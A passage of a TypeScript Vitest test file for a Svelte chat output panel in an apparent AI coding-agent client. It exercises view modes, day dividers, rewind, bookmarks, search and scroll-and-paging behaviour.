import { describe, it, expect, beforeAll, beforeEach, afterEach, vi } from 'vitest';
import '@testing-library/jest-dom/vitest';
import { render, cleanup, fireEvent, screen, within } from '@testing-library/svelte';
import { tick } from 'svelte';

// MarkdownBlock (pulled in transitively) calls DOMPurify.addHook at module load.
// DOMPurify's default export resolves to a factory in this test environment, so
// stub it — these tests render no markdown (empty message list).
vi.mock('dompurify', () => ({
  default: { addHook: () => {}, sanitize: (html: string) => html },
}));

// Counted, to see an edit's diff isn't worked out again; otherwise the real one.
vi.mock('diff', async (importOriginal) => {
  const actual = await importOriginal<typeof import('diff')>();
  return { ...actual, createPatch: vi.fn(actual.createPatch) };
});
import { createPatch } from 'diff';
import OutputPanel from './OutputPanel.svelte';
import { messageStore, type ChatMessage } from '../stores/messages.svelte.js';
import { store } from '../stores/sessions.svelte.js';
import { settingsStore } from '../stores/settings.svelte.js';
import { arrivalScene } from '../stores/arrivalScene.svelte.js';
import { bookmarkStore } from '../stores/bookmarks.svelte.js';
import { usageStore } from '../stores/usage.svelte.js';

const SID = 'panel-session';

beforeEach(() => {
  messageStore.messagesBySession = { [SID]: [] };
  messageStore.paginationBySession = {};
  // A view mode a test set (Focus hides status lines) would carry into the next.
  messageStore.viewModeBySession = {};
  store.sessions = [];
  // jsdom's focus() collapses the selection onto the focused element (the
  // Ctrl+F test focuses the search box) and leaves it there, and addRange()
  // does nothing while a range exists. Start every test with none.
  window.getSelection()?.removeAllRanges();
});

afterEach(() => cleanup());

/** jsdom has no layout. Lays the chat out with each row (a message, or a
 *  fold of notes) drawn `rowHeight` tall, one under another, in a scroller
 *  500px tall, and returns it. With no scroll anchoring, as Chromium at the
 *  very top. */
function layOut(container: HTMLElement, rowHeight = 100): HTMLElement {
  const el = container.querySelector<HTMLElement>('.overflow-y-auto')!;
  const rows = () => [...el.querySelectorAll<HTMLElement>(':scope > [data-msg-id], :scope > details[data-notes]')];
  Object.defineProperty(el, 'scrollHeight', { configurable: true, get: () => rows().length * rowHeight });
  Object.defineProperty(el, 'clientHeight', { configurable: true, value: 500 });
  vi.spyOn(Element.prototype, 'getBoundingClientRect').mockImplementation(function (this: Element) {
    const i = this === el ? -1 : rows().indexOf(this as HTMLElement);
    const top = i < 0 ? 0 : i * rowHeight - el.scrollTop;
    const height = this === el ? 500 : rowHeight;
    return { top, bottom: top + height, left: 0, right: 0, width: 0, height, x: 0, y: top, toJSON: () => ({}) };
  });
  return el;
}

async function pressCtrlF() {
  window.dispatchEvent(new KeyboardEvent('keydown', { key: 'f', ctrlKey: true, bubbles: true }));
  await tick();
}

describe('OutputPanel — status messages', () => {
  it('shows a warning-level status as a note, and a plain one without', () => {
    store.activeSessionId = SID;
    messageStore.messagesBySession = {
      [SID]: [
        { kind: 'system', id: 's1', text: 'Connecting...' },
        { kind: 'system', id: 's2', text: 'Runs without a sandbox', level: 'warning' },
      ],
    };
    const { getByRole, getByText } = render(OutputPanel, { sessionId: SID });

    expect(getByRole('note')).toHaveTextContent('Runs without a sandbox');
    expect(getByText('Connecting...').closest('[role="note"]')).toBeNull();
  });
});

describe("OutputPanel: a turn's end", () => {
  const done: ChatMessage = { kind: 'result', id: 'r1', subtype: 'success', isError: false, totalCostUsd: 0, durationMs: 800 };
  const failed: ChatMessage = { ...done, id: 'r2', subtype: 'error_during_execution', isError: true, errors: ['Tool crashed'] };

  beforeEach(() => {
    store.activeSessionId = SID;
  });
  afterEach(() => messageStore.setViewMode(SID, 'detailed'));

  it('shows "done" with its cost and time in Detailed', () => {
    messageStore.setViewMode(SID, 'detailed');
    messageStore.messagesBySession = { [SID]: [{ kind: 'user', id: 'u1', text: 'Fix it' }, done] };
    const { getByText } = render(OutputPanel, { sessionId: SID });
    expect(getByText(/done/)).toHaveTextContent('$0.0000');
    expect(getByText(/done/)).toHaveTextContent('0.8s');
  });

  it("puts a turn's time and cost on its summary line in Summary", () => {
    messageStore.setViewMode(SID, 'summary');
    messageStore.messagesBySession = { [SID]: [{ kind: 'user', id: 'u1', text: 'Fix it' }, { ...done, totalCostUsd: 0.41, durationMs: 192_000 }] };
    const { container, queryByText } = render(OutputPanel, { sessionId: SID });
    // No steps, so the line is text rather than a button that opens them.
    const turn = container.querySelector('[data-turn="u1"]')!;
    expect(turn).toHaveTextContent('Worked 3m 12s $0.41');
    expect(queryByText(/done/)).toBeNull();
  });

  it('hides a turn that went fine in Focus', () => {
    messageStore.setViewMode(SID, 'focus');
    messageStore.messagesBySession = { [SID]: [{ kind: 'user', id: 'u1', text: 'Fix it' }, done] };
    const { queryByText } = render(OutputPanel, { sessionId: SID });
    expect(queryByText(/done/)).toBeNull();
    expect(queryByText(/\$0\.0000/)).toBeNull();
  });

  it('keeps a turn that ended with errors in Focus, without its cost and time', () => {
    messageStore.setViewMode(SID, 'focus');
    messageStore.messagesBySession = { [SID]: [{ kind: 'user', id: 'u1', text: 'Fix it' }, failed] };
    const { getByText, queryByText } = render(OutputPanel, { sessionId: SID });
    expect(getByText(/completed with errors/)).toBeInTheDocument();
    expect(getByText('Tool crashed')).toBeInTheDocument();
    expect(queryByText(/\$0\.0000/)).toBeNull();
    expect(queryByText(/0\.8s/)).toBeNull();
  });
});

describe('OutputPanel — rewind from a user message', () => {
  it('offers Rewind on user messages that have a checkpoint and opens the dialog on that message', async () => {
    store.activeSessionId = SID;
    messageStore.messagesBySession = {
      [SID]: [
        { kind: 'user', id: 'u1', text: 'first prompt', uuid: 'uuid-1' },
        { kind: 'text', id: 't1', text: 'reply', uuid: 'a1' },
        { kind: 'user', id: 'u2', text: 'second prompt', uuid: 'uuid-2' },
      ],
    };
    const openSpy = vi.spyOn(messageStore, 'openRewindDialog');
    const { getAllByRole } = render(OutputPanel, { sessionId: SID });

    const buttons = getAllByRole('button', { name: 'Rewind to this message' });
    expect(buttons).toHaveLength(2);

    buttons[1].click();
    expect(openSpy).toHaveBeenCalledWith(SID, 'uuid-2');
    expect(messageStore.rewindDialogOpen[SID]).toBe(true);
    expect(messageStore.getRewindDialogTarget(SID)).toBe('uuid-2');
    openSpy.mockRestore();
    messageStore.closeRewindDialog(SID);
  });

  it('does not offer Rewind on a user message without a checkpoint', () => {
    store.activeSessionId = SID;
    messageStore.messagesBySession = {
      [SID]: [{ kind: 'user', id: 'u1', text: 'no checkpoint yet' }],
    };
    const { queryByRole } = render(OutputPanel, { sessionId: SID });
    expect(queryByRole('button', { name: 'Rewind to this message' })).toBeNull();
  });
});

describe('OutputPanel: day dividers', () => {
  const at = (day: number, hour: number, minute = 0) => new Date(2026, 9, day, hour, minute).getTime();
  /** The prompt a divider sits above: the next row's, or in Summary the
   *  first message of the turn card under it. */
  const promptBelow = (divider: Element) => {
    const next = divider.nextElementSibling;
    return next?.getAttribute('data-msg-id') ?? next?.querySelector('[data-msg-id]')?.getAttribute('data-msg-id');
  };

  it('marks the first prompt of each day, passing over prompts with no time', () => {
    vi.useFakeTimers({ toFake: ['Date'], now: at(22, 12) });
    try {
      store.activeSessionId = SID;
      messageStore.messagesBySession = {
        [SID]: [
          { kind: 'user', id: 'u0', text: 'from before times were kept' },
          { kind: 'user', id: 'u1', text: 'first', sentAt: at(21, 9) },
          { kind: 'text', id: 't1', text: 'reply', uuid: 'a1' },
          { kind: 'user', id: 'u2', text: 'same day', sentAt: at(21, 17) },
          { kind: 'user', id: 'u3', text: 'next day', sentAt: at(22, 8) },
        ],
      };
      const { getAllByRole } = render(OutputPanel, { sessionId: SID });

      const dividers = getAllByRole('separator');
      expect(dividers.map((d) => d.textContent?.trim())).toEqual(['Yesterday', 'Today']);
      // Each sits just above its day's first prompt.
      expect(promptBelow(dividers[0])).toBe('u1');
      expect(promptBelow(dividers[1])).toBe('u3');
    } finally {
      vi.useRealTimers();
    }
  });

  it('marks the first prompt drawn when its day began above the messages drawn', async () => {
    vi.useFakeTimers({ toFake: ['Date'], now: at(22, 12) });
    try {
      store.activeSessionId = SID;
      // 60 messages: the day's first prompt is the oldest, and only the newest 50 draw.
      const replies = Array.from({ length: 58 }, (_, i) => ({ kind: 'text' as const, id: `t${i}`, text: `reply ${i}`, uuid: `a${i}` }));
      messageStore.messagesBySession = {
        [SID]: [
          { kind: 'user', id: 'u1', text: 'morning', sentAt: at(22, 8) },
          ...replies.slice(0, 54),
          { kind: 'user', id: 'u2', text: 'later', sentAt: at(22, 11) },
          ...replies.slice(54),
        ],
      };
      const { container, getAllByRole, getByRole } = render(OutputPanel, { sessionId: SID });
      await vi.waitFor(() => expect(container.querySelectorAll('[data-msg-id]')).toHaveLength(50));

      let dividers = getAllByRole('separator');
      expect(dividers).toHaveLength(1);
      expect(dividers[0]).toHaveTextContent('Today');
      expect(promptBelow(dividers[0])).toBe('u2');

      // Loading the older messages moves it up to the day's first prompt.
      await fireEvent.click(getByRole('button', { name: /Load 10 older messages/ }));
      dividers = getAllByRole('separator');
      expect(dividers).toHaveLength(1);
      expect(promptBelow(dividers[0])).toBe('u1');
    } finally {
      vi.useRealTimers();
    }
  });

  it('moves Today on to Yesterday at midnight', async () => {
    vi.useFakeTimers({ toFake: ['Date', 'setInterval', 'clearInterval'], now: at(22, 23, 59) });
    try {
      store.activeSessionId = SID;
      messageStore.messagesBySession = { [SID]: [{ kind: 'user', id: 'u1', text: 'late', sentAt: at(22, 23, 30) }] };
      const { getByRole } = render(OutputPanel, { sessionId: SID });
      expect(getByRole('separator')).toHaveTextContent('Today');

      vi.advanceTimersByTime(60_000);
      await tick();
      expect(getByRole('separator')).toHaveTextContent('Yesterday');
    } finally {
      vi.useRealTimers();
    }
  });
});

describe('OutputPanel: git identity notice', () => {
  it('shows the notice with its commands in the conversation', () => {
    store.activeSessionId = SID;
    messageStore.messagesBySession = { [SID]: [{ kind: 'git_identity_missing', id: 'g1' }] };
    const { getByRole } = render(OutputPanel, { sessionId: SID });
    expect(getByRole('note')).toHaveTextContent('git config --global user.email');
  });
});

describe('OutputPanel: sign-in failure', () => {
  it('links to the Agents settings under a sign-in error, and only there', async () => {
    store.activeSessionId = SID;
    messageStore.messagesBySession = { [SID]: [
      { kind: 'error', id: 'e1', text: 'Claude couldn\'t sign in.', auth: true },
      { kind: 'error', id: 'e2', text: 'Something else broke' },
    ] };
    const { getAllByRole } = render(OutputPanel, { sessionId: SID });
    const links = getAllByRole('button', { name: 'Open Settings → Agents' });
    expect(links).toHaveLength(1);
    await fireEvent.click(links[0]);
    expect(settingsStore.panelOpen).toBe(true);
    expect(settingsStore.requestedSection).toBe('agents');
    settingsStore.panelOpen = false;
    settingsStore.requestedSection = null;
  });
});

describe('OutputPanel — Ctrl+F search gating (fix C)', () => {
  it('opens search when this pane is the active session', async () => {
    store.activeSessionId = SID;
    const { queryByPlaceholderText } = render(OutputPanel, { sessionId: SID });

    expect(queryByPlaceholderText('Search full history...')).toBeNull();
    await pressCtrlF();
    expect(queryByPlaceholderText('Search full history...')).toBeInTheDocument();
  });

  it('ignores Ctrl+F when a different session is active', async () => {
    // This pane is mounted (hidden) but another session is active.
    store.activeSessionId = 'some-other-session';
    const { queryByPlaceholderText } = render(OutputPanel, { sessionId: SID });

    await pressCtrlF();
    expect(queryByPlaceholderText('Search full history...')).toBeNull();
  });

  it('ignores Ctrl+F while another tab of this conversation is showing', async () => {
    store.activeSessionId = SID;
    messageStore.setActiveTab(SID, 'changes');
    const { queryByPlaceholderText } = render(OutputPanel, { sessionId: SID });

    await pressCtrlF();
    messageStore.setActiveTab(SID, 'activity');
    await tick();

    expect(queryByPlaceholderText('Search full history...')).toBeNull();
  });
});

describe('OutputPanel — bookmark jumps', () => {
  afterEach(() => {
    vi.restoreAllMocks();
    Reflect.deleteProperty(Element.prototype, 'scrollIntoView');
    messageStore.pendingJumpBySession = {};
  });

  it('still makes a jump asked for while an earlier one is paging in history', async () => {
    Element.prototype.scrollIntoView = vi.fn();
    store.activeSessionId = SID;
    messageStore.messagesBySession = {
      [SID]: [
        { kind: 'text', id: 'm1', text: 'deep', uuid: 'a1' },
        { kind: 'text', id: 'm2', text: 'recent', uuid: 'a2' },
      ],
    };
    let finishPaging!: () => void;
    vi.spyOn(messageStore, 'loadOlderUntil').mockImplementation((_sid: string, eventIndex: number) =>
      eventIndex === 1 ? new Promise<void>((r) => { finishPaging = r; }) : Promise.resolve());
    const find = vi.spyOn(messageStore, 'findMessageForEvent').mockImplementation(async (_sid, ei) => (ei === 1 ? 'm1' : 'm2'));
    render(OutputPanel, { sessionId: SID });

    messageStore.requestJump(SID, { eventIndex: 1, uuid: null, bookmarkId: 'A' });
    await tick();
    messageStore.requestJump(SID, { eventIndex: 40, uuid: null, bookmarkId: 'B' });
    await tick();
    finishPaging();

    await vi.waitFor(() => expect(find).toHaveBeenCalledWith(SID, 40));
    await vi.waitFor(() => expect(messageStore.pendingJumpBySession[SID]).toBeUndefined());
  });

  it('waits for the thread to be open again when the user switches away mid-jump', async () => {
    Element.prototype.scrollIntoView = vi.fn();
    store.activeSessionId = SID;
    messageStore.setViewMode(SID, 'summary');
    messageStore.messagesBySession = { [SID]: [{ kind: 'text', id: 'm1', text: 'recent', uuid: 'a1' }] };
    let finishPaging!: () => void;
    const paging = vi.spyOn(messageStore, 'loadOlderUntil').mockImplementationOnce(() => new Promise<void>((r) => { finishPaging = r; }));
    paging.mockResolvedValue();
    // The target is paged in while the user is away.
    vi.spyOn(messageStore, 'findMessageForEvent').mockResolvedValue('m0');
    render(OutputPanel, { sessionId: SID });

    messageStore.requestJump(SID, { eventIndex: 0, uuid: null, bookmarkId: 'A' });
    await tick();
    store.activeSessionId = 'another';
    messageStore.messagesBySession = { [SID]: [{ kind: 'text', id: 'm0', text: 'deep', uuid: 'a0' }, { kind: 'text', id: 'm1', text: 'recent', uuid: 'a1' }] };
    finishPaging();
    await vi.waitFor(() => expect(paging).toHaveBeenCalledTimes(1));
    await new Promise((r) => setTimeout(r, 0));

    // Not looked for in the chat as it stood: no fallback view, no fallback text.
    expect(messageStore.getViewMode(SID)).toBe('summary');
    expect(messageStore.pendingJumpBySession[SID]).toBeDefined();

    store.activeSessionId = SID;
    await vi.waitFor(() => expect(messageStore.pendingJumpBySession[SID]).toBeUndefined());
    expect(Element.prototype.scrollIntoView).toHaveBeenCalled();
    expect(messageStore.getViewMode(SID)).toBe('summary');
    messageStore.viewModeBySession = {};
  });
});

describe('OutputPanel: a bookmark whose text is gone', () => {
  afterEach(() => { bookmarkStore.list = []; });

  it('shows its text and its links', async () => {
    store.activeSessionId = SID;
    bookmarkStore.list = [{
      id: 'gone', sessionId: SID, repoPath: '/r', sessionLabel: 'x', messageUuid: 'u-gone', eventIndex: null,
      selectedText: 'Read the setup guide', createdAt: 0,
      links: [{ kind: 'web', href: 'https://docs.example.dev/setup', text: 'setup guide' }],
    }];
    render(OutputPanel, { sessionId: SID });

    messageStore.requestJump(SID, { eventIndex: null, uuid: 'u-gone', bookmarkId: 'gone' });

    expect(await screen.findByText('Read the setup guide')).toBeInTheDocument();
    expect(screen.getByRole('list', { name: 'Links in this bookmark' })).toHaveTextContent('setup guide');
  });
});

describe('OutputPanel — live reply', () => {
  afterEach(() => { messageStore.streamingText = {}; });

  it('draws the live reply only while its conversation is showing', async () => {
    store.activeSessionId = 'another';
    messageStore.streamingText = { [SID]: 'Half a **reply**' };
    const { container } = render(OutputPanel, { sessionId: SID });
    expect(container.querySelector('.markdown-content')).toBeNull();

    store.activeSessionId = SID;
    await tick();

    expect(container.querySelector('.markdown-content strong')).toHaveTextContent('reply');
  });
});

describe('OutputPanel: follows the conversation after being hidden', () => {
  // jsdom has no layout or ResizeObserver: stub both. A hidden element
  // measures 0; showing it resizes the container, which fires the observer.
  let resized: () => void;
  beforeEach(() => {
    vi.stubGlobal('ResizeObserver', class {
      constructor(cb: ResizeObserverCallback) { resized = () => cb([], this); }
      observe() {}
      unobserve() {}
      disconnect() {}
    });
    store.activeSessionId = SID;
    messageStore.messagesBySession = { [SID]: [{ kind: 'user', id: 'u1', text: 'hello' }] };
  });
  afterEach(() => vi.unstubAllGlobals());

  function measure(el: HTMLElement, m: { scrollTop: number; scrollHeight: number; clientHeight: number }) {
    for (const [key, value] of Object.entries(m)) {
      Object.defineProperty(el, key, { configurable: true, writable: true, value });
    }
  }
  const scroller = (container: HTMLElement) => container.querySelector<HTMLElement>('.overflow-y-auto')!;

  it('jumps to the bottom when shown, over the offset the browser restores', () => {
    const { container, queryByTitle } = render(OutputPanel, { sessionId: SID });
    const el = scroller(container);
    // Output arrived while hidden; the browser brings back the old offset.
    measure(el, { scrollTop: 300, scrollHeight: 2000, clientHeight: 500 });
    resized();
    expect(el.scrollTop).toBe(2000);
    expect(queryByTitle('Scroll to bottom')).toBeNull();
  });

  it('leaves a reader who scrolled up where they are', async () => {
    const { container, findByTitle } = render(OutputPanel, { sessionId: SID });
    const el = scroller(container);
    measure(el, { scrollTop: 0, scrollHeight: 2000, clientHeight: 500 });
    el.dispatchEvent(new Event('scroll'));
    await findByTitle('Scroll to bottom');
    resized();
    expect(el.scrollTop).toBe(0);
  });

  it('keeps the oldest rendered message while scrolled up and new ones arrive', async () => {
    messageStore.messagesBySession = {
      [SID]: Array.from({ length: 60 }, (_, i) => ({ kind: 'text', id: `m${i}`, text: `reply ${i}`, uuid: `a${i}` })),
    };
    messageStore.setViewMode(SID, 'detailed');
    const { container, findByTitle } = render(OutputPanel, { sessionId: SID });
    const el = scroller(container);
    await vi.waitFor(() => expect(container.querySelector('[data-msg-id="m10"]')).not.toBeNull());
    measure(el, { scrollTop: 0, scrollHeight: 5000, clientHeight: 500 });
    el.dispatchEvent(new Event('scroll'));
    await findByTitle('Scroll to bottom');

    messageStore.ingestEvent(SID, { type: 'assistant_text', text: 'reply 60', uuid: 'a60' } as never);
    await tick();

    expect(container.querySelector('[data-msg-id="m10"]')).not.toBeNull();
  });

  it('renders only the latest page again after reading back, once the user sends', async () => {
    messageStore.messagesBySession = {
      [SID]: Array.from({ length: 60 }, (_, i) => ({ kind: 'text', id: `m${i}`, text: `reply ${i}`, uuid: `a${i}` })),
    };
    messageStore.setViewMode(SID, 'detailed');
    const { container, getByText } = render(OutputPanel, { sessionId: SID });
    await fireEvent.click(getByText(/older messages/));
    await tick();
    expect(container.querySelector('[data-msg-id="m0"]')).not.toBeNull();

    messageStore.ingestEvent(SID, { type: 'user_message', text: 'next', uuid: 'u-next' } as never);
    await tick();

    // The latest 50 of 61: m11 to m59 and the new prompt.
    expect(container.querySelector('[data-msg-id="m10"]')).toBeNull();
    expect(container.querySelector('[data-msg-id="m11"]')).not.toBeNull();
  });

  it('stops following the stream after a jump to an older message', async () => {
    Element.prototype.scrollIntoView = vi.fn();
    messageStore.messagesBySession = {
      [SID]: [{ kind: 'text', id: 'm1', text: 'older', uuid: 'a1' }, { kind: 'text', id: 'm2', text: 'newer', uuid: 'a2' }],
    };
    vi.spyOn(messageStore, 'loadOlderUntil').mockResolvedValue();
    vi.spyOn(messageStore, 'findMessageForEvent').mockResolvedValue('m1');
    const { container } = render(OutputPanel, { sessionId: SID });
    const el = scroller(container);
    measure(el, { scrollTop: 1500, scrollHeight: 2000, clientHeight: 500 });

    messageStore.requestJump(SID, { eventIndex: 0, uuid: null, bookmarkId: '' });
    await vi.waitFor(() => expect(Element.prototype.scrollIntoView).toHaveBeenCalled());
    el.scrollTop = 1450; // the smooth scroll has only just started
    messageStore.streamingText = { ...messageStore.streamingText, [SID]: 'more text' };
    await tick();
    await new Promise((r) => requestAnimationFrame(() => r(null)));

    expect(el.scrollTop).toBe(1450);
    Reflect.deleteProperty(Element.prototype, 'scrollIntoView');
    vi.restoreAllMocks();
    messageStore.streamingText = {};
    messageStore.pendingJumpBySession = {};
  });

  it('stays at the bottom when a thread image loads after the scroll', async () => {
    messageStore.messagesBySession = {
      [SID]: [{ kind: 'user', id: 'u1', text: 'look', images: [{ name: 'shot.png', dataUrl: 'data:image/png;base64,AA' }] }],
    };
    const { container, getByRole } = render(OutputPanel, { sessionId: SID });
    const el = scroller(container);
    // Let the scroll the first render queued happen first.
    await new Promise((r) => requestAnimationFrame(r));
    measure(el, { scrollTop: 1500, scrollHeight: 2000, clientHeight: 500 });
    // The image loads and the content grows; the container's size doesn't change.
    measure(el, { scrollHeight: 2128 } as never);
    await fireEvent.load(getByRole('img', { name: 'shot.png' }));
    await vi.waitFor(() => expect(el.scrollTop).toBe(2128));
  });

  it('leaves a reader who scrolled up where they are when an image loads', async () => {
    messageStore.messagesBySession = {
      [SID]: [{ kind: 'user', id: 'u1', text: 'look', images: [{ name: 'shot.png', dataUrl: 'data:image/png;base64,AA' }] }],
    };
    const { container, getByRole, findByTitle } = render(OutputPanel, { sessionId: SID });
    const el = scroller(container);
    // Let the scroll the first render queued happen before the reader moves.
    await new Promise((r) => requestAnimationFrame(r));
    measure(el, { scrollTop: 0, scrollHeight: 2000, clientHeight: 500 });
    el.dispatchEvent(new Event('scroll'));
    await findByTitle('Scroll to bottom');
    await fireEvent.load(getByRole('img', { name: 'shot.png' }));
    await new Promise((r) => requestAnimationFrame(r));
    expect(el.scrollTop).toBe(0);
  });

  it('ignores scroll events while hidden', async () => {
    const { container, findByTitle, getByTitle } = render(OutputPanel, { sessionId: SID });
    const el = scroller(container);
    measure(el, { scrollTop: 0, scrollHeight: 2000, clientHeight: 500 });
    el.dispatchEvent(new Event('scroll'));
    await findByTitle('Scroll to bottom');
    measure(el, { scrollTop: 0, scrollHeight: 0, clientHeight: 0 });
    el.dispatchEvent(new Event('scroll'));
    await tick();
    expect(getByTitle('Scroll to bottom')).toBeInTheDocument();
  });
});

describe('OutputPanel: drawing a loaded page', () => {
  const replies = (n: number) => Array.from({ length: n }, (_, i) => ({ kind: 'text', id: `m${i}`, text: `reply ${i}`, uuid: `a${i}` }));
  const drawn = (container: HTMLElement) => [...container.querySelectorAll<HTMLElement>('[data-msg-id]')].map((el) => el.dataset.msgId);

  beforeEach(() => {
    store.activeSessionId = SID;
    messageStore.setViewMode(SID, 'detailed');
  });
  afterEach(() => vi.restoreAllMocks());

  it('draws history that loads into an empty thread newest first, then the rest a batch per frame', async () => {
    const { container } = render(OutputPanel, { sessionId: SID });
    // Count what each DOM update adds, to see the first one stays small.
    const added: number[] = [];
    new MutationObserver((records) => {
      added.push(records.reduce((n, r) => n + [...r.addedNodes].filter((node) => node instanceof HTMLElement && node.dataset.msgId).length, 0));
    }).observe(container, { childList: true, subtree: true });

    messageStore.messagesBySession = { [SID]: replies(60) as never };
    await tick();

    expect(drawn(container)).toEqual(Array.from({ length: 10 }, (_, i) => `m${50 + i}`));
    await vi.waitFor(() => expect(drawn(container)).toHaveLength(50));
    expect(drawn(container)[0]).toBe('m10');
    expect(Math.max(...added)).toBe(10);
  });

  it('draws a page already there when the pane mounts the same way', async () => {
    messageStore.messagesBySession = { [SID]: replies(30) as never };
    const { container } = render(OutputPanel, { sessionId: SID });

    expect(drawn(container)).toHaveLength(10);
    await vi.waitFor(() => expect(drawn(container)).toHaveLength(30));
  });

  it('keeps a reader who scrolled up in place as older batches join above', async () => {
    messageStore.messagesBySession = { [SID]: replies(30) as never };
    const { container } = render(OutputPanel, { sessionId: SID });
    const el = layOut(container);
    el.scrollTop = 200;
    el.dispatchEvent(new Event('scroll'));

    await vi.waitFor(() => expect(drawn(container)).toHaveLength(30));
    await tick();
    // Two batches of ten joined above, 1000px each.
    expect(el.scrollTop).toBe(2200);
  });

  it('makes up only what the browser did not when older batches join above', async () => {
    messageStore.messagesBySession = { [SID]: replies(20) as never };
    const { container } = render(OutputPanel, { sessionId: SID });
    const el = layOut(container);
    el.scrollTop = 200;
    el.dispatchEvent(new Event('scroll'));
    // Scroll anchoring, as Chromium does above the top: rows drawn above the
    // one in view move the scroll offset with them as they're laid out.
    let rowsSeen = drawn(container).length;
    new MutationObserver(() => {
      const now = drawn(container).length;
      el.scrollTop += (now - rowsSeen) * 100;
      rowsSeen = now;
    }).observe(el, { childList: true });

    await vi.waitFor(() => expect(drawn(container)).toHaveLength(20));
    await tick();
    // One batch of ten, 1000px, moved by the browser alone.
    expect(el.scrollTop).toBe(1200);
  });

  it('draws a short thread at once', () => {
    messageStore.messagesBySession = { [SID]: replies(8) as never };
    const { container } = render(OutputPanel, { sessionId: SID });

    expect(drawn(container)).toHaveLength(8);
  });

  it('draws older messages the user asks for at once', async () => {
    messageStore.messagesBySession = { [SID]: replies(60) as never };
    const { container, getByText } = render(OutputPanel, { sessionId: SID });
    expect(drawn(container)).toHaveLength(10);

    await fireEvent.click(getByText(/older messages/));
    await tick();

    expect(drawn(container)).toHaveLength(60);
  });

  it('adds new messages to a thread that has loaded without batching them', async () => {
    messageStore.messagesBySession = { [SID]: replies(12) as never };
    const { container } = render(OutputPanel, { sessionId: SID });
    await vi.waitFor(() => expect(drawn(container)).toHaveLength(12));

    messageStore.ingestEvent(SID, { type: 'assistant_text', text: 'reply 12', uuid: 'a12' } as never);
    await tick();

    expect(drawn(container)).toHaveLength(13);
  });
});

describe('OutputPanel: scrolling up loads older messages', () => {
  const texts = (prefix: string, n: number): ChatMessage[] =>
    Array.from({ length: n }, (_, i) => ({ kind: 'text', id: `${prefix}${i}`, text: `${prefix} ${i}`, uuid: `${prefix}-${i}` }));
  const tools = (prefix: string, n: number): ChatMessage[] =>
    Array.from({ length: n }, (_, i) => ({ kind: 'tool_call', id: `${prefix}${i}`, toolName: 'Read', toolInput: { file_path: 'a.ts' }, toolUseId: `${prefix}-tu${i}`, uuid: `${prefix}-${i}`, pending: false }));
  const drawn =(container: HTMLElement) => [...container.querySelectorAll<HTMLElement>('[data-msg-id]')].map((el) => el.dataset.msgId);
  const scrollTo = (el: HTMLElement, top: number) => {
    el.scrollTop = top;
    el.dispatchEvent(new Event('scroll'));
  };
  const nextFrame = () => new Promise((r) => requestAnimationFrame(r));

  beforeEach(() => {
    store.activeSessionId = SID;
    messageStore.setViewMode(SID, 'detailed');
  });
  afterEach(() => {
    vi.restoreAllMocks();
    Reflect.deleteProperty(Element.prototype, 'scrollIntoView');
    messageStore.pendingJumpBySession = {};
  });

  it('draws the next older messages near the top, keeping the one in view where it is', async () => {
    messageStore.messagesBySession = { [SID]: texts('m', 80) };
    const { container } = render(OutputPanel, { sessionId: SID });
    await vi.waitFor(() => expect(drawn(container)).toHaveLength(50));
    const el = layOut(container);

    // At the very top, reading m30, the oldest drawn.
    scrollTo(el, 0);

    await vi.waitFor(() => expect(drawn(container)).toHaveLength(80));
    await tick();
    expect(drawn(container)[0]).toBe('m0');
    // Thirty rows of 100px joined above m30.
    expect(el.scrollTop).toBe(3000);
  });

  it('draws them a batch per frame', async () => {
    messageStore.messagesBySession = { [SID]: texts('m', 80) };
    const { container } = render(OutputPanel, { sessionId: SID });
    await vi.waitFor(() => expect(drawn(container)).toHaveLength(50));
    const el = layOut(container);
    const added: number[] = [];
    new MutationObserver((records) => {
      added.push(records.reduce((n, r) => n + [...r.addedNodes].filter((node) => node instanceof HTMLElement && node.dataset.msgId).length, 0));
    }).observe(el, { childList: true });

    scrollTo(el, 0);

    await vi.waitFor(() => expect(drawn(container)).toHaveLength(80));
    expect(Math.max(...added)).toBe(10);
  });

  it('leaves them until the reader is within a screen of the top', async () => {
    messageStore.messagesBySession = { [SID]: texts('m', 80) };
    const { container, findByTitle } = render(OutputPanel, { sessionId: SID });
    await vi.waitFor(() => expect(drawn(container)).toHaveLength(50));
    const el = layOut(container);

    scrollTo(el, 600);
    await findByTitle('Scroll to bottom');
    await nextFrame();
    await tick();

    expect(drawn(container)).toHaveLength(50);
  });

  it('reads the next page of history once the loaded messages are all drawn', async () => {
    messageStore.messagesBySession = { [SID]: texts('r', 20) };
    messageStore.setPagination(SID, 300, 100);
    const load = vi.spyOn(messageStore, 'loadOlderEvents').mockImplementation(async () => {
      messageStore.messagesBySession = { [SID]: [...texts('o', 60), ...messageStore.getMessages(SID)] };
      messageStore.setPagination(SID, 300, 0);
    });
    const { container, findByText } = render(OutputPanel, { sessionId: SID });
    await vi.waitFor(() => expect(drawn(container)).toHaveLength(20));
    const el = layOut(container);

    scrollTo(el, 0);

    // Fifty more of the sixty it read, above r0, which stays in place.
    await vi.waitFor(() => expect(drawn(container)).toHaveLength(70));
    await tick();
    expect(load).toHaveBeenCalledTimes(1);
    expect(drawn(container)[0]).toBe('o10');
    expect(el.scrollTop).toBe(5000);
    await findByText(/Load 10 older messages/);
  });

  it('reads on past a page of history that holds nothing the view shows', async () => {
    messageStore.setViewMode(SID, 'focus');
    messageStore.messagesBySession = { [SID]: texts('r', 20) };
    messageStore.setPagination(SID, 600, 400);
    // Tool calls only (Focus hides them), then replies.
    const pages = [tools('t', 10), [...texts('o', 60), { kind: 'user', id: 'u0', text: 'next' } as ChatMessage]];
    const load = vi.spyOn(messageStore, 'loadOlderEvents').mockImplementation(async () => {
      messageStore.messagesBySession = { [SID]: [...pages.shift()!, ...messageStore.getMessages(SID)] };
      messageStore.setPagination(SID, 600, pages.length * 200);
    });
    const { container } = render(OutputPanel, { sessionId: SID });
    await vi.waitFor(() => expect(drawn(container)).toHaveLength(20));
    const el = layOut(container);

    scrollTo(el, 0);

    await vi.waitFor(() => expect(drawn(container)).toHaveLength(70));
    expect(load).toHaveBeenCalledTimes(2);
  });

  it('keeps a fold of notes at the top in place as older notes join it', async () => {
    messageStore.setViewMode(SID, 'focus');
    // One run of notes between tool calls (hidden in Focus), so one fold.
    const run = Array.from({ length: 70 }, (_, i) => [texts('n', 70)[i], tools('t', 70)[i]]).flat();
    messageStore.messagesBySession = { [SID]: [{ kind: 'user', id: 'u1', text: 'fix it' }, ...run, { kind: 'text', id: 'ans', text: 'Done', uuid: 'a-ans' }] };
    const { container } = render(OutputPanel, { sessionId: SID });
    await vi.waitFor(() => expect(drawn(container)).toHaveLength(50));
    const el = layOut(container, 400);

